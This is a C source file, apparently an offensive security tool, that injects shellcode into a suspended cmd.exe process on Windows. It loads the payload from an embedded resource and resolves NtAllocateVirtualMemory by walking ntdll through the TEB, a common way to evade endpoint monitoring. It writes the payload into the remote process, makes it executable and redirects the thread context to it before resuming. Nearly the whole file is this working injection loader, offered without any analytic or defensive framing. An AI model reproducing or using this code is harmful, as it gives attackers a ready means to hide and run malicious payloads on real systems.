/*
	Creator: Praksh Chandra Yadav
	Version: 1

*/

#include <stdio.h>
#include <wchar.h>
#include <string.h>
#include <windows.h>
#include "resources.h"

/*globals*/
char* NtAllocateVirtualMemoryAddressBase_;
char* NtWriteVirtualMemoryBase_;

/*Function asm*/
unsigned int SyscallIdFinder_(char* returnedNtdllBase, char* ntApiName, size_t lenNtApiName);
char* SyscallBaseFinder_(char* returnedNtdllBase, char* ntApiName, size_t lenNtApiName);
char* DllModuleBaseFinder_(char* ModuleName, size_t lenModuleName);
char* GetBaseAddressExportFunc_(char* baseDll, char* exportFunctionToCall, size_t lenExportFunctionName);

int main(int argc, char** argv) {	
	
	/*Load resource*/
	HRSRC res;
	HANDLE resHandle;
	char* payload;
	size_t payloadLength;
	
	//FindRsource to obtain the handle to resouce Information block
	res = FindResource(NULL, MAKEINTRESOURCE(PAYLOAD_ICO), RT_RCDATA);
	
	//LoadResource API to obtain a handle to the Resource i.e the payload
	resHandle = LoadResource(NULL, res);
	
	//LockResource API to obtain a pointer to our payload
	payload = LockResource(resHandle);
	payloadLength = SizeofResource(NULL, res);	

	/*Create process*/	
	int retVal;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));	
	retVal = CreateProcess("C:\\Windows\\System32\\cmd.exe",			//lpApplicationName //hardcoded name
				NULL,							//lpCommandLine
				NULL,							//lpProcessAttributes
				NULL,							//lpThreadAttributes
				FALSE,							//bInheritHandles
				CREATE_SUSPENDED,					//dwCreationFlags
				NULL,							//lpEnvironment
				NULL,							//lpCurrentDirectory,
				&si,							//lpStartupInfo
				&pi							//lpProcessInformation
				);
	if(retVal == 0) {
		return -1;
	}
	
	/*Retrieve the base address of module ntdll using TEB */
	wchar_t* moduleNameToFind = L"ntdll.dll";	
	unsigned long long returnedNtdllBase;
	size_t lenModuleName = wcslen(moduleNameToFind); 	
	returnedNtdllBase = DllModuleBaseFinder_(moduleNameToFind, 
						lenModuleName
						);

	char* ntApiName = "NtAllocateVirtualMemory";
	size_t lenNtApiName = strlen(ntApiName);
	char* syscallBase;
	syscallBase = SyscallBaseFinder_(returnedNtdllBase, 				// retrieve API address
					ntApiName,
					lenNtApiName
					);
	NtAllocateVirtualMemoryAddressBase_ = syscallBase;
	
	/*ntApiName = "NtWriteVirtualMemory";
	lenNtApiName = strlen(ntApiName);
	syscallBase;
	syscallBase = SyscallBaseFinder_(returnedNtdllBase, 				// retrieve API address
					ntApiName,
					lenNtApiName
					);

	NtWriteVirtualMemoryBase_ = syscallBase;
	*/

	/*Copy payload to temp local memory*/
	void* localBaseAddressAllocatedMem = NULL;	
	PSIZE_T size = payloadLength;
	NTSTATUS (*AllocMem)(HANDLE, void*, unsigned long *, size_t, unsigned long, unsigned long) = NtAllocateVirtualMemoryAddressBase_;
	NTSTATUS status = (*AllocMem)(-1,
				&localBaseAddressAllocatedMem,
				0,
				&size,
				0x3000,
				0x4);


	for(int i=0;i<payloadLength;i++){
		*((char*)localBaseAddressAllocatedMem+i) = payload[i];
	}

	/*
	__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
	  [in]      HANDLE    ProcessHandle,
	  [in, out] PVOID     *BaseAddress,
	  [in]      ULONG_PTR ZeroBits,
	  [in, out] PSIZE_T   RegionSize,
	  [in]      ULONG     AllocationType,
	  [in]      ULONG     Protect
	);*/		

	void* RemoteBaseAddressAllocatedMem = NULL;	
	//NTSTATUS (*AllocMem)(HANDLE, void*, unsigned long *, size_t, unsigned long, unsigned long) = NtAllocateVirtualMemoryAddressBase_;
	status = (*AllocMem)(pi.hProcess,
			&RemoteBaseAddressAllocatedMem,
			0,
			&size,
			0x3000,
			0x4
			);

	/*copy payload to remote process*/
	size_t NumberOfBytesWritten = 0;
	retVal = WriteProcessMemory(pi.hProcess,
				RemoteBaseAddressAllocatedMem,
				(const void*)localBaseAddressAllocatedMem,
				size,
				&NumberOfBytesWritten
				);
						
	if(retVal == 0) {
		return -1;
	}
	
	int oldProtect;
	retVal = VirtualProtectEx(pi.hProcess,					//hProcess
				RemoteBaseAddressAllocatedMem,			//lpAddress
				size,						//dwSize
				0x20,						//flNewProtect PAGE_READEXECUTE
				&oldProtect					//lpflOldProtect
				);
	if(retVal == 0) {
		return -1;
	}
	
	/* Retrieve the thread context of the remote process */
	CONTEXT context;
	ZeroMemory(&context,sizeof(context));
	context.ContextFlags = CONTEXT_INTEGER;
	retVal = GetThreadContext(pi.hThread,					//hThread
				&context					//lpContext
				);
	if(retVal == 0){
		return -1;
	}
	
	//context.Rcx = (unsigned long long)RemoteBaseAddressAllocatedMem + offsetExportFunc;				
	
	/* Change the thread context of the remote process to the start of the shellcode */
	context.Rcx = (unsigned long long)RemoteBaseAddressAllocatedMem;		////rcx points to the entry point, rdx = PEB
	context.ContextFlags = CONTEXT_INTEGER;
	retVal = SetThreadContext(pi.hThread,
				&context
				);
	if(retVal == 0){
		return -1;
	}
	ResumeThread(pi.hThread);
	
	/*wait for remote process to finish*/
	WaitForSingleObject(pi.hProcess, -1);

}	
/*end main()*/


















